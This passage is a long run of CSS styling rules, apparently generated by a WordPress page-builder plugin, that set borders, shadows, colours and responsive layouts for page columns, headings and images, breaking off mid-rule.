> .kadence-column76_ff3b51-62:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_ff3b51-62 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_ff3b51-62 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_9399b2-3d, .wp-block-kadence-advancedheading.kt-adv-heading76_9399b2-3d[data-kb-block="kb-adv-heading76_9399b2-3d"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_9399b2-3d mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_9399b2-3d[data-kb-block="kb-adv-heading76_9399b2-3d"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_9399b2-3d img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_9399b2-3d[data-kb-block="kb-adv-heading76_9399b2-3d"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_9399b2-3d, .wp-block-kadence-advancedheading.kt-adv-heading76_9399b2-3d[data-kb-block="kb-adv-heading76_9399b2-3d"]{font-size:22px;}}.kb-row-layout-id76_5b90ea-85 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_5b90ea-85 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_e864d0-95 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_e864d0-95 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_e864d0-95 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_e864d0-95 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_e864d0-95 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_e864d0-95, .kt-inside-inner-col > .kadence-column76_e864d0-95:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_e864d0-95 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_e864d0-95 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_eb412a-6c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_eb412a-6c > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_eb412a-6c > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_eb412a-6c > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_eb412a-6c > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_eb412a-6c, .kt-inside-inner-col > .kadence-column76_eb412a-6c:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_eb412a-6c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_eb412a-6c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_3f9132-f5, .wp-block-kadence-advancedheading.kt-adv-heading76_3f9132-f5[data-kb-block="kb-adv-heading76_3f9132-f5"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_3f9132-f5 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_3f9132-f5[data-kb-block="kb-adv-heading76_3f9132-f5"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_3f9132-f5 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_3f9132-f5[data-kb-block="kb-adv-heading76_3f9132-f5"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_3f9132-f5, .wp-block-kadence-advancedheading.kt-adv-heading76_3f9132-f5[data-kb-block="kb-adv-heading76_3f9132-f5"]{font-size:22px;}}.kb-row-layout-id76_a77120-76 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_a77120-76 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_c67ef9-0d > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_c67ef9-0d > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_c67ef9-0d > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_c67ef9-0d > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_c67ef9-0d > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_c67ef9-0d, .kt-inside-inner-col > .kadence-column76_c67ef9-0d:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_c67ef9-0d > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_c67ef9-0d > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_af03ca-57 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_af03ca-57 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_af03ca-57 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_af03ca-57 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_af03ca-57 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_af03ca-57, .kt-inside-inner-col > .kadence-column76_af03ca-57:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_af03ca-57 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_af03ca-57 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_2176e1-6d, .wp-block-kadence-advancedheading.kt-adv-heading76_2176e1-6d[data-kb-block="kb-adv-heading76_2176e1-6d"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_2176e1-6d mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_2176e1-6d[data-kb-block="kb-adv-heading76_2176e1-6d"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_2176e1-6d img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_2176e1-6d[data-kb-block="kb-adv-heading76_2176e1-6d"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_2176e1-6d, .wp-block-kadence-advancedheading.kt-adv-heading76_2176e1-6d[data-kb-block="kb-adv-heading76_2176e1-6d"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_3e7ed5-b4:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_3e7ed5-b4 .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_3e7ed5-b4 img.kb-img, .kb-image76_3e7ed5-b4 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_3e7ed5-b4 img.kb-img, .kb-image76_3e7ed5-b4 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_3e7ed5-b4.kb-image-is-ratio-size, .kb-image76_3e7ed5-b4 .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_3e7ed5-b4 figure{max-width:150px;}.kb-image76_3e7ed5-b4 img.kb-img, .kb-image76_3e7ed5-b4 .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_5f6a9c-61 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_5f6a9c-61 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_54836b-a3 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_54836b-a3 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_54836b-a3 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_54836b-a3 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_54836b-a3 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_54836b-a3, .kt-inside-inner-col > .kadence-column76_54836b-a3:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_54836b-a3 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_54836b-a3 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_3097bc-e4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_3097bc-e4 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_3097bc-e4 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_3097bc-e4 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_3097bc-e4 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_3097bc-e4, .kt-inside-inner-col > .kadence-column76_3097bc-e4:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_3097bc-e4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_3097bc-e4 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_1e27d4-0c, .wp-block-kadence-advancedheading.kt-adv-heading76_1e27d4-0c[data-kb-block="kb-adv-heading76_1e27d4-0c"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_1e27d4-0c mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_1e27d4-0c[data-kb-block="kb-adv-heading76_1e27d4-0c"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_1e27d4-0c img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_1e27d4-0c[data-kb-block="kb-adv-heading76_1e27d4-0c"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_1e27d4-0c, .wp-block-kadence-advancedheading.kt-adv-heading76_1e27d4-0c[data-kb-block="kb-adv-heading76_1e27d4-0c"]{font-size:22px;}}.kb-row-layout-id76_4ba7cb-c6 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_4ba7cb-c6 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_2c02ab-db > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_2c02ab-db > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_2c02ab-db > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_2c02ab-db > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_2c02ab-db > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_2c02ab-db, .kt-inside-inner-col > .kadence-column76_2c02ab-db:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_2c02ab-db > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_2c02ab-db > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_4b1e9d-ad > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_4b1e9d-ad > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_4b1e9d-ad > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_4b1e9d-ad > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_4b1e9d-ad > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_4b1e9d-ad, .kt-inside-inner-col > .kadence-column76_4b1e9d-ad:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_4b1e9d-ad > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_4b1e9d-ad > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_5d7fc9-90, .wp-block-kadence-advancedheading.kt-adv-heading76_5d7fc9-90[data-kb-block="kb-adv-heading76_5d7fc9-90"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_5d7fc9-90 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_5d7fc9-90[data-kb-block="kb-adv-heading76_5d7fc9-90"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_5d7fc9-90 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_5d7fc9-90[data-kb-block="kb-adv-heading76_5d7fc9-90"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_5d7fc9-90, .wp-block-kadence-advancedheading.kt-adv-heading76_5d7fc9-90[data-kb-block="kb-adv-heading76_5d7fc9-90"]{font-size:22px;}}.kb-row-layout-id76_bacd57-8d > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_bacd57-8d > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_252190-6d > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_252190-6d > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_252190-6d > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_252190-6d > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_252190-6d > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_252190-6d, .kt-inside-inner-col > .kadence-column76_252190-6d:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_252190-6d > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_252190-6d > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_b443a3-14 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_b443a3-14 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_b443a3-14 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_b443a3-14 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_b443a3-14 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_b443a3-14, .kt-inside-inner-col > .kadence-column76_b443a3-14:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_b443a3-14 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_b443a3-14 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_915563-77, .wp-block-kadence-advancedheading.kt-adv-heading76_915563-77[data-kb-block="kb-adv-heading76_915563-77"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_915563-77 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_915563-77[data-kb-block="kb-adv-heading76_915563-77"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_915563-77 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_915563-77[data-kb-block="kb-adv-heading76_915563-77"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_915563-77, .wp-block-kadence-advancedheading.kt-adv-heading76_915563-77[data-kb-block="kb-adv-heading76_915563-77"]{font-size:22px;}}.wp-block-kadence-image.kb-image76_839d12-bb:not(.kb-specificity-added):not(.kb-extra-specificity-added){margin-bottom:30px;}.kb-image76_839d12-bb .kb-image-has-overlay:after{opacity:0.3;}.kb-image76_839d12-bb img.kb-img, .kb-image76_839d12-bb .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);box-shadow:2px 2px 14px 0px #244893;}@media all and (max-width: 1024px){.kb-image76_839d12-bb img.kb-img, .kb-image76_839d12-bb .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}@media all and (max-width: 767px){.kb-image76_839d12-bb.kb-image-is-ratio-size, .kb-image76_839d12-bb .kb-image-is-ratio-size{max-width:150px;width:100%;}.kb-image76_839d12-bb figure{max-width:150px;}.kb-image76_839d12-bb img.kb-img, .kb-image76_839d12-bb .kb-img img{border-top:5px solid var(--global-palette2, #2B6CB0);border-right:5px solid var(--global-palette2, #2B6CB0);border-bottom:5px solid var(--global-palette2, #2B6CB0);border-left:5px solid var(--global-palette2, #2B6CB0);}}.kb-row-layout-id76_419e68-65 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_419e68-65 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_c2fe2c-5a > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_c2fe2c-5a > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_c2fe2c-5a > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_c2fe2c-5a > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_c2fe2c-5a > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_c2fe2c-5a, .kt-inside-inner-col > .kadence-column76_c2fe2c-5a:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_c2fe2c-5a > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_c2fe2c-5a > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_37dd7e-46 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_37dd7e-46 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_37dd7e-46 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_37dd7e-46 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_37dd7e-46 > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_37dd7e-46, .kt-inside-inner-col > .kadence-column76_37dd7e-46:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_37dd7e-46 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_37dd7e-46 > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_ea4da7-a7, .wp-block-kadence-advancedheading.kt-adv-heading76_ea4da7-a7[data-kb-block="kb-adv-heading76_ea4da7-a7"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_ea4da7-a7 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_ea4da7-a7[data-kb-block="kb-adv-heading76_ea4da7-a7"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_ea4da7-a7 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_ea4da7-a7[data-kb-block="kb-adv-heading76_ea4da7-a7"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_ea4da7-a7, .wp-block-kadence-advancedheading.kt-adv-heading76_ea4da7-a7[data-kb-block="kb-adv-heading76_ea4da7-a7"]{font-size:22px;}}.kb-row-layout-id76_7f6a49-91 > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_7f6a49-91 > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_2ed2c1-80 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_2ed2c1-80 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_2ed2c1-80 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_2ed2c1-80 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_2ed2c1-80 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_2ed2c1-80, .kt-inside-inner-col > .kadence-column76_2ed2c1-80:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_2ed2c1-80 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_2ed2c1-80 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.kadence-column76_3b84b4-8c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;}.kadence-column76_3b84b4-8c > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_3b84b4-8c > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_3b84b4-8c > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_3b84b4-8c > .kt-inside-inner-col{background-color:#184678;}.kadence-column76_3b84b4-8c, .kt-inside-inner-col > .kadence-column76_3b84b4-8c:not(.specificity){margin-top:30px;margin-bottom:30px;}@media all and (max-width: 1024px){.kadence-column76_3b84b4-8c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_3b84b4-8c > .kt-inside-inner-col{border-top:6px double #ffffff;border-right:6px double #ffffff;border-bottom:6px double #ffffff;border-left:6px double #ffffff;flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_33c8ef-88, .wp-block-kadence-advancedheading.kt-adv-heading76_33c8ef-88[data-kb-block="kb-adv-heading76_33c8ef-88"]{padding-bottom:2px;text-align:center;color:#ffffff;text-shadow:1px 1px 14px rgba(45,45,45,0.99);}.wp-block-kadence-advancedheading.kt-adv-heading76_33c8ef-88 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_33c8ef-88[data-kb-block="kb-adv-heading76_33c8ef-88"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_33c8ef-88 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_33c8ef-88[data-kb-block="kb-adv-heading76_33c8ef-88"] img.kb-inline-image{width:150px;display:inline-block;}@media all and (max-width: 767px){.wp-block-kadence-advancedheading.kt-adv-heading76_33c8ef-88, .wp-block-kadence-advancedheading.kt-adv-heading76_33c8ef-88[data-kb-block="kb-adv-heading76_33c8ef-88"]{font-size:22px;}}.kb-row-layout-id76_0c7b9a-4a > .kt-row-column-wrap{padding-top:10px;padding-bottom:10px;grid-template-columns:minmax(0, 1fr);}@media all and (max-width: 767px){.kb-row-layout-id76_0c7b9a-4a > .kt-row-column-wrap{grid-template-columns:minmax(0, 1fr);}}.kadence-column76_82b293-c4 > .kt-inside-inner-col{padding-top:20px;padding-right:15px;padding-bottom:20px;padding-left:15px;}.kadence-column76_82b293-c4 > .kt-inside-inner-col{box-shadow:rgba(0, 0, 0, 0.2) 0px 0px 14px 0px;}.kadence-column76_82b293-c4 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_82b293-c4 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_82b293-c4 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_82b293-c4, .kt-inside-inner-col > .kadence-column76_82b293-c4:not(.specificity){margin-right:20px;margin-left:20px;}@media all and (max-width: 1024px){.kadence-column76_82b293-c4 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}@media all and (max-width: 767px){.kadence-column76_82b293-c4 > .kt-inside-inner-col{flex-direction:column;justify-content:center;}}.wp-block-kadence-advancedheading.kt-adv-heading76_1a0b2a-b6 mark.kt-highlight, .wp-block-kadence-advancedheading.kt-adv-heading76_1a0b2a-b6[data-kb-block="kb-adv-heading76_1a0b2a-b6"] mark.kt-highlight{-webkit-box-decoration-break:clone;box-decoration-break:clone;}.wp-block-kadence-advancedheading.kt-adv-heading76_1a0b2a-b6 img.kb-inline-image, .wp-block-kadence-advancedheading.kt-adv-heading76_1a0b2a-b6[data-kb-block="kb-adv-heading76_1a0b2a-b6"] img.kb-inline-image{width:150px;display:inline-block;}.kadence-column76_6e5e1e-52 > .kt-inside-inner-col{border-left:6px solid var(--global-palette2, #2B6CB0);}.kadence-column76_6e5e1e-52 > .kt-inside-inner-col{column-gap:var(--global-kb-gap-sm, 1rem);}.kadence-column76_6e5e1e-52 > .kt-inside-inner-col{flex-direction:column;}.kadence-column76_6e5e1e-52 > .kt-inside-inner-col > .aligncenter{width:100%;}.kadence-column76_6e5e1e-52 > .kt-inside-inner-col{background-color:#ececec;}.kadence-column76_6e5e1e-52, .kt-inside-inner-col > 